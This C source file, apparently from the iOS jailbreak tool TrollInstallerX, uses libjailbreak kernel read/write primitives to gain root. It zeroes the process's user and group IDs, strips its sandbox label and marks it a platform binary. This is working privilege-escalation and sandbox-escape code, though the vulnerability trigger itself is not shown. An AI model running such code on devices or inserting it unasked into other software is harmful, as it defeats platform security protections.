//
//  KernelExploit.c
//  TrollInstallerX
//
//  Created by Alfie on 06/03/2024.
//

#include <stdio.h>
#include <xpf/xpf.h>
#include <libjailbreak/info.h>
#include <libjailbreak/translation.h>
#include <libjailbreak/primitives_IOSurface.h>
#include <libjailbreak/kalloc_pt.h>
#include <libjailbreak/physrw_pte.h>
#include <libjailbreak/util.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/primitives.h>
#include <libjailbreak/codesign.h>

xpc_object_t _systemInfoXdict;

int initialise_kernel_info(const char *kernelPath) {
    int r = xpf_start_with_kernel_path(kernelPath);
    if (r == 0) {
        char *sets[] = {
            "translation",
            "trustcache",
            "sandbox",
            "physmap",
            "struct",
            "physrw",
            "perfkrw",
            NULL,
            NULL,
            NULL,
        };
        
        uint32_t idx = 7;
        if (xpf_set_is_supported("devmode")) {
            sets[idx++] = "devmode";
        }
        
        _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
        if (_systemInfoXdict) {
            xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
            printf("System Info:\n");
            xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
                return true;
            });
        }
        if (!_systemInfoXdict) {
            return -1;
        }
        xpf_stop();
    } else {
        xpf_stop();
        return -1;
    }
    
    jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();
    _systemInfoXdict = jbinfo_get_serialized();
    
    if (_systemInfoXdict) {
        printf("System Info libjailbreak:\n");
        xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
            if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                if (xpc_uint64_get_value(value)) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
            }
            return true;
        });
    }
    
    return 0;
}

void prepare_for_ppl_bypass(void) {
    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();
}

void initialise_kalloc_pt(void) {
    libjailbreak_kalloc_pt_init();
}

int build_physrw_primitive(void) {
    int r = libjailbreak_physrw_pte_init(false);
    if (r != 0) {
        return -1;
    }
    return 0;
}

int get_root(void) {
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);
    
    // Give ourselves UID 0
    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);
    
    // Give ourselves GID 0
    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);
    
    // Add P_SUGID
    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }
    
    if (getuid() != 0 || getgid() != 0) {
        printf("getuid()=%d, getgid()=%d\n", getuid(), getgid());
        return -1;
    }
    
    return 0;
}

void unsandbox(void) {
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);
    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
}

int platformise(void) {
    uint64_t proc = proc_self();
    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) {
        return -1;
    }
    return 0;
}
